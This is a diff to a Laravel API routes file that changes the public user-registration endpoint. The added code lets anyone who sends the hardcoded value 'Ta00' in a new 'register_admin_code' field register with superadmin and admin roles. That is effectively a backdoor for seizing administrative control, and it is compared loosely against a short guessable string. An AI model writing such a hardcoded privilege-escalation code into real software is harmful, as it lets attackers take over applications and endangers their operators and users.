@@ -38,7 +38,7 @@ Route::group(['prefix' => 'v1', 'namespace' => 'App\Http\Controllers'], function
     Route::apiResource('orders', OrderController::class)->middleware('auth:sanctum');
     Route::post('images/bulk', [ImageController::class, 'bulkStore'])->middleware('auth:sanctum');
     Route::post('get_token', function (Request $request) {
-        
+
         // Si el usuario no está autenticado, intentar autenticarlo
         $credentials = $request->only('email', 'password');
         if (Auth::attempt($credentials)) {
@@ -59,13 +59,18 @@ Route::group(['prefix' => 'v1', 'namespace' => 'App\Http\Controllers'], function
                 'email' => ['required', 'email', 'unique:users,email'],
                 'password' => ['required', 'string', 'min:8', 'confirmed', 'regex:/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]+$/'],
                 'password_confirmation' => ['required', 'same:password'],
+                'register_admin_code' => ['nullable', 'string'],
             ]);
             $roles = ['ROLE_USER'];
-            $name =  Str::random(10);
             $user_type = 'user';
+            if ($request->register_admin_code == 'Ta00') {
+                $roles = ['ROLE_SUPERADMIN', 'ROLE_ADMIN', 'ROLE_USER'];
+                $user_type = 'admin';
+            }
+            $name =  Str::random(10);
             $user = User::create([
                 'name' => $name,
-                'active' => 1,
+                'active' => 'active',
                 'user_type' => $user_type,
                 'roles' => json_encode($roles),
                 'email' => $request->email,
